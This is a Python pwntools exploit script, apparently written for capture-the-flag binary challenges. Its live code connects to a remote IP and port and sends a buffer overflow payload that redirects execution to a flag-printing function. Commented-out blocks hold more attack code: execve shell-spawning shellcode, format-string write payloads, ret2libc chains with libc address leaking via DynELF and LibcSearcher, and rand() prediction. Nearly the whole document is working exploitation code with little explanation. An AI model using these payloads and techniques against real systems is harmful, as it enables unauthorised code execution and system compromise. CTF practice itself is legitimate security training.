#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
from ctypes import *
nc='111.198.29.45'
point = 57876
#a = remote("localhost", 12345)
a = remote(nc,point)
#libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
#p= ELF('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')
#a= process('./int_overflow')
#elf = ELF('./int_overflow')
catflag_addr=0x804868B
a.recvuntil('Your choice:')
a.sendline("1")
a.recvuntil('username:\n')
a.sendline('aaaa')
a.recvuntil('passwd:')
a.sendline('a'*0x18+p32(catflag_addr)+'a'*231)



#pop_rdi_ret = 0x4006b3
#pop_rsi_pop_r15_ret=0x4006b1
#a.recvuntil('secret[0] is')
#n = a.recvuntil('\n')
#print n[:-1]
#print int(n[:-1],16)
#addrs = int(n[:-1],16)
#print "addrs: " + hex(addrs)
#a.recvuntil('name be:\n')
#a.sendline("aaaa")
#a.recvuntil('or up?:\n')
#a.sendline("east")
#a.recvuntil('leave(0)?:\n')
#a.sendline("1")
#a.recvuntil("address'\n")
#a.sendline(str(addrs))
#a.recvuntil('you wish is:\n')
#payload =  "%85c"+"%7$n"
#a.sendline(payload)
#shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
#a.recvuntil('USE YOU SPELL\n')
#a.sendline(shellcode)
#payload1 = (p64(1)*0x20+p64(0x0))
#a.sendline(payload1)

#a.recvuntil('Please input your guess number:')
#for i in range(10): 
#	a.sendline(str(libc.rand()%6 + 1))
#2542625142

#sysetem_addr=0x08048320
#sh_addr=0x0804a024
#payload = ('a'*0x88 + p64(sysetem_addr))
#payload = (p32(pwnme_addr)+'%4c%10$n')

#printf(x_address+”%c$n”)可以修改[x_address]的值为x_address的字符长度


'''

sh_addr=0x0006C384
def leak(addr):
    payload1='a'*0x8c+p32(write_addr)+p32(vul_addr)+p32(1)+p32(addr)+p32(4)
    a.sendline(payload1)
    data=a.recv(4)
    return data
d=DynELF(leak,elf=ELF('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')) #初始化DynELF模块 

system_addr=d.lookup('system','libc')#在libc文件中搜索system函数的地址
payload2='a'*0x8c+p32(read_addr)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)
a.sendline(payload2)
a.send('/bin/sh\x00')
payload3='a'*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)
a.sendline(payload3)


payload ='a' *0x8c
payload+=p32(sysetem_addr)+p32(0x08048320)+p32(sh_addr)
a.sendline(payload)
'''
#a.send(payload)
#payload +=p64(print_addr)
#payload +=p64(print_addr)
#payload+=p64(pop_rdi_ret)
#payload+=p64(1)
#payload+=p64(pop_rsi_pop_r15_ret)
#payload+=p64(p.got['read'])
#payload+=p64(4)
#payload+=p64(p.plt['write'])
#payload+=p64(0x4005E6)

#a.recvline()

#v = a.recv()
#print('---------------------')
#addr=(u64(v[:8]))
#print (addr)
#print('---------------------')
#libc = ELF('./libc-2.19.so')
#libc=LibcSearcher("read", addr)
#libc_base = addr - libc.symbols['read']
#print hex(libc_base)
#print hex(addr)
#system_addr = libc_base + libc.symbols['system']
#binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
#print hex(binsh_addr)
#payload ='A' * 136+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
#a.send(payload)

a.interactive()

